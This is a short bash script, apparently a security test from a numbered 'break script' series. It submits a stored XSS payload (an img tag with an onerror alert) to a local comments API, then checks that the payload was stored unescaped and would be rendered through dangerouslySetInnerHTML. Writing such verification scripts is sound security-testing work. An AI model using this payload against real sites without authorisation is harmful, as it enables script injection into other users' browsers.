#!/usr/bin/env bash
set -e

# ==============================================================================
# Break Script 04: Stored XSS Verification
# ==============================================================================
# Target: POST /api/comments & GET /api/comments
# Attack Flow:
# 1. Post unescaped HTML/JavaScript payload into comments forum
# 2. Query comments API and verify payload is stored unescaped
# 3. Observe payload renders directly via dangerouslySetInnerHTML in Dashboard
# ==============================================================================

BASE_URL="${BASE_URL:-http://localhost:3000}"
PAYLOAD="<img src=x onerror=alert('XSS')>"

echo "[*] Submitting Stored XSS payload to /api/comments..."
POST_RES=$(curl -s -X POST "${BASE_URL}/api/comments" \
  -H "Content-Type: application/json" \
  -d "{\"author_name\": \"XSS_Auditor\", \"body\": \"${PAYLOAD}\"}")

echo "[+] Submission Response: ${POST_RES}"

echo ""
echo "[*] Fetching all comments to verify unescaped storage..."
GET_RES=$(curl -s "${BASE_URL}/api/comments")

echo "${GET_RES}" | node -e '
  const fs = require("fs");
  const input = fs.readFileSync(0, "utf-8");
  try {
    const json = JSON.parse(input);
    const found = (json.comments || []).some(c => c.body.includes("onerror=alert"));
    if (found) {
      console.log("\n[!] VULNERABILITY CONFIRMED: Raw HTML payload stored without sanitization!");
      console.log("[!] Client dashboard renders this with dangerouslySetInnerHTML, executing script in browser context.");
    }
  } catch {
    console.log(input);
  }
'
